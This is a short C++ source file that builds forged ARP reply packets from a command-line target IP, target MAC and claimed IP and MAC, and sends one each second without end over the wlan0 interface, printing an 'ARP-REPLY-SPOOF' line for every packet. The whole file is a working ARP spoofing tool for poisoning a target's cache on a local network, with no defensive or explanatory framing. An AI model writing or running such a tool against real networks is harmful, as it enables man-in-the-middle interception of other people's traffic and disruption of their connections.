#include "pgen.h"
#include <stdio.h>
#define DEV "wlan0"

int main(int argc,char** argv){
	if(argc != 5){
		printf("usage: %s targetIP targetMAC ipaddr macaddr\n", 
				argv[0]);
		return -1;
	}

	pgen_arp pack;
	
	pack.ETH.src = argv[4];
	pack.ETH.dst = argv[2];
	pack.ARP.srcEth = argv[4];
	pack.ARP.srcIp  = argv[3];
	pack.ARP.dstEth = argv[2];
	pack.ARP.dstIp  = argv[1];
	pack.ARP.option = PGEN_ARPOP_REPLY;
	
	printf("\n");
	for(int i=0; ; i++){
		printf("0x%03x: %s[%s] -ARP-REPLY-SPOOF-> %s[%s]\n", i, 
				pack.ARP.srcIp.c_str(),
				pack.ARP.srcEth.c_str(),
				pack.ARP.dstIp.c_str(),
				pack.ARP.dstEth.c_str() );

		pack.SEND(DEV);
		sleep(1);
	}
}

